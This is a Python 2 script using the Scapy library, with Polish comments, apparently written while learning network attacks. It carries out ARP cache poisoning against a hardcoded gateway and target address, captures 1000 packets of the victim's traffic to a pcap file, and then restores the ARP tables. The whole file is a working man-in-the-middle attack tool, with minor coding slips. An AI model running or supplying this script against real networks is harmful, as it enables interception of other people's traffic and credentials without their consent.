from scapy.all import *
import os
import sys
import threading
import signal

#ogolnie idea jest taka zeby zamienic nasz MAC na ten ktory ma router
interface = "wlp3s0"
gateway_ip = "192.168.0.2"
target_ip = "192.168.0.12"
packet_count = 1000

def restore_target(gateway_ip,
                   gateway_mac,
                   target_ip,
                   target_mac):
    #nieco inna metoda z wykorzystaniem funkcji send
    print "[*] przywracanie stanu pierwotnego sieci..."
    send(ARP(op=2,
             psrc=gateway_ip,
             pdst=target_ip,
             hwdst="ff:ff:ff:ff:ff:ff",
             hwsrc=gateway_mac),
         count=5)

    send(ARP(op=2,
             psrc=target_ip,
             pdst=gateway_ip,
             hwdst="ff:ff:ff:ff:ff:ff",
             hwsrc=target_mac),
         count = 5)

    #sygnalizuje watkowi glownemu ze ma zakonczyc dzialanie
    os.kill(os.getpid(),
            signal.SIGINT)

def get_mac(ip_address):
    #srp wysyla zadanie arp na okreslony adres ip w celu zdobycia zwiazanego z nim adresu mac
    responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address),
                                timeout=2,retry = 10)

    #zwraca adres MAC z odpowiedzi
    for s,r in responses:
        return r[Ether].src

        return None

#wysyla zadania arp do zainfekowanego komp docelowego jak i bramy, dzieki czemu
#mozemy ogladac ruch przechadzacy przez nasz cel
#zadania wysylamy w petli aby zapewnic zatrucie odpowiednich wpisow w bufforze
#arp przez caly czas trwania ataku
def poison_target(gateway_ip,
                  gateway_mac,
                  target_ip,
                  target_mac):


    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac

    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    print "[*] rozpoczynanie infekowania ARP, [CTRL C aby zatrzymac]"

    while True:
        try:
            send(poison_target)
            send(poison_gateway)

            time.sleep(2)
        except KeyboardInterrupt:
            restore_target(gateway_ip,
                           gateway_mac,
                           target_ip,
                           target_mac)
    print "[*] atak zakonczony"
    return


#ustawienia interfejsu
conf.iface = interface

#wylaczenie wynikow
conf.verb = 0

print "[*] konfiguracja interfejsu %s" % interface

gateway_mac = get_mac(gateway_ip)

if gateway_mac is None:
    print "[!!!] nie udalo sie pobrac adresu mac bramy, koniec"
    sys.exit(0)
else:
    print "[*] brama %s jest pod adresem %s" % (gateway_ip, gateway_mac)

target_mac = get_mac(target_ip)

if target_mac is None:
    print"[!!!] nie udalo sie pobrac adresu mac celu. konczenie"
    sys.exit(0)
else:
    print "[*] kompouter docelowy %s jest pod adresem %s" % (target_ip, target_mac)

#uruchomienie watku infekujacego
poison_thread = threading.Thread(target = poison_target,
                                 args = (gateway_ip,gateway_mac,target_ip,target_mac))
poison_thread.start()

try:
    print "[*] uruchamianie szperacza dla %d pakietow " %packet_count

    #filtr uzyty do tego by przechwycic tylko ruch do naszego targetu
    bpf_filter = "ip host %s" % target_ip
    packets = sniff(count = packet_count,
                    filter = bpf_filter,
                    iface = interface)
    #drukowanie przechwyconych pakietow
    wrpcap('arper.pcap', packets)

    #przywroceniesieci
    restore_target(gateway_ip,gateway_mac,target_ip,target_mac)

except KeyboardInterrupt:
    #przywrocenie sieci
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    sys.exit(0)



